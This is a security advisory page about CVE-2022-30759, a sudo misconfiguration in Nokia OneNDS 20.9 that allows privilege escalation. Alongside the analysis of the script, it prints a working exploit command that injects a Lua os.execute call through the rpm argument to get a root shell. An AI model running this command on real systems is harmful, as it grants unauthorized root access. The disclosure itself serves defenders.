---
title: Nokia OneNDS 20.9 Insecure Permissions / Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023040066
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-22
fetch_date: 2025-10-04T11:32:33.748067
---

# Nokia OneNDS 20.9 Insecure Permissions / Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Nokia OneNDS 20.9 Insecure Permissions / Privilege Escalation** **2023.04.21**  Credit:  **[Giacomo Sighinolfi](https://cxsecurity.com/author/Giacomo%2BSighinolfi/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-30759](https://cxsecurity.com/cveshow/CVE-2022-30759/ "Click to see CVE-2022-30759")**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

===============================================================================
title: Incorrect Permission Assignment
product: Nokia OneNDS 20.9
vulnerability type: Security Misconfiguration
severity: High
CVSS Score: 7.8
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
found on: 04/05/2022
by: Giacomo Sighinolfi <giacomosighinolfi@gmail.com>
cve: CVE-2022-30759
===============================================================================
Some sudo permissions can be exploited by some users to escalate to root
privileges and execute arbitrary commands on the system.
The affected users are:
Provgw, notifs, dbmrun, (system users)
They can run as root the following script:
/opt/cntdb/bin/noscripts\_rpm.sh
It can be exploited with:
sudo /opt/cntdb/bin/noscripts\_rpm.sh force-erase
"--eval '%{lua:os.execute(\"/bin/sh\")}'"
===============================================================================
Detailed analysis:
The script accept as first argument one of the these options:
install|update|fallback|erase|test-install|test-update|test-erase|
force-install|force-update|force-erase
and as a second argument an arbitrary rpm package name.
If we analyze the switch case code block (row 175) we can see how the first
argument influence the execution of the script.
175. case "$1" in
…
224. test-erase)
225. TEST\_OPTION="--test"
226. OPTION="-e"
227. ;;
…
238. force-erase)
239. TEST\_OPTION="--nodeps"
240. OPTION="-e"
241. ;;
…
Using “force-erase” or “test-erase” as the first argument, it creates “OPTION”
variable with “-e” as its value. That value allow us to trigger a privilege
escalation exploiting the rpm command (row 254) with a particular rpm package
name as second parameter passed to the script.
…
252. if [ $OPTION == "-e" ]
253. then
254. rpm $OPTION --noscripts $TEST\_OPTION $2
…
===============================================================================

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040066)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top